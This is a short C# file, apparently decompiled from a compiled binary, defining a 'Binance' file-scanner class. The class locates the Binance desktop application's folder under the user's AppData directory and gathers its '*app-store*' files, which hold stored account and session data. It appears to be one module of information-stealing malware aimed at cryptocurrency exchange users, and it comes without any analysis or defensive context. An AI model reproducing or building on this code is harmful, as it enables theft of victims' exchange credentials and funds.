using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x0200001C RID: 28
public class Binance : FileScanner
{
	// Token: 0x060000A4 RID: 164 RVA: 0x000037DC File Offset: 0x000019DC
	public Binance()
	{
		base.Name = "Binance";
	}

	// Token: 0x060000A5 RID: 165 RVA: 0x00003779 File Offset: 0x00001979
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x060000A6 RID: 166 RVA: 0x00008088 File Offset: 0x00006288
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Binance";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*app-store*",
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
